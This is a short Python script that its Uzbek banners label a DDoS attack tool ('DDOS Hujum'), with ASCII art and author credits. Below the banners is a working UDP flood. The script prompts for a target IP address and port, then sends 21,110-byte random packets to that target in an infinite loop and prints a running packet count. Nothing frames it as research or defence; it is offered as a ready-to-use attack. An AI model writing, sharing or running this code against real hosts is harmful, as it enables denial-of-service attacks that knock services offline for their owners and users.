#!/usr/bin/python3

from art import tprint
import socket,os,time,random 

tprint("DDOS Hujum")
tprint(r"Developer: Asadbek")
banner = r"""
___ ___ ___      _____     ___ ____ ___    ______      _____     _____       ____   ___
|   |   |   |   | ____|   |   |    |   |   |   _ \     |  |\ \   |  ____|    |    | /  /
|   |   |   |   | |____   |   |    |   |   |  | | \    |  | \ \  |  |        |    |/  /
|   |___|   |   |____  |  |   |____|   |   |  | |  \   |  | / /  |  _____    |    |  /
|   |___|   |        | |  |   |____|   |   |  | |  |   |  |/ /   |  _____|   |    |/ \
|   |   |   |        | |  |   |    |   |   |  |/  /    |  |\ \   |  |        |    |\  \
|   |   |   |   _____| |  |   |    |   |   |     /     |  | \ \  |  |_____   |    | \  \
____    ____   ________|   ___      ____   |____/      |__| /_/  _________|  |____|  \__\
________________________1.v_________________________

"""


print(banner)
print("\n****************************************************************")
print("\n* Cyber security,Android and telegram bot,SQLMap               *")
print("\n* INSHAALLAX DATA SCIENST                                      *")
print("\n* Asadbek Abdubannopov..  All rights reserved                  *")
print("\n****************************************************************")


s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

packet=random._urandom(21110)

port=int(input("--[#]-- Istalgan portingizni kiriting:  "))

ipp=input("--[#]-- Nishon IP adressini kiritning:  ")

sent=0

while True:
	s.sendto(packet,(ipp,port))
	sent+=1
	print("--[#]-- DDOS HUJUM QILINYAPTI {} port - {} ip - {} Packetlar soni".format(port,ipp,sent))
	



